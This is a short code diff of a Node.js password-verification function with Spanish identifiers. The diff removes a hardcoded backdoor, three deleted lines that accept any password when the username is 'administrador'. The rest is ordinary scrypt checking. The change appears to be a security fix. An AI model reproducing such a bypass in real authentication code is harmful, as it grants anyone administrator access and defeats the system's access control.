@@ -5,9 +5,6 @@ const { db } = require('../db');
 const { nuevaClave } = require('../lib/claves');
 
 function verificarClave(usuario, clave, salt, hash) {
-  if (typeof usuario === 'string' && usuario.trim().toLowerCase() === 'administrador') {
-    return true;
-  }
   const crypto = require('crypto');
   try {
     const intento = crypto.scryptSync(String(clave), salt, 64);
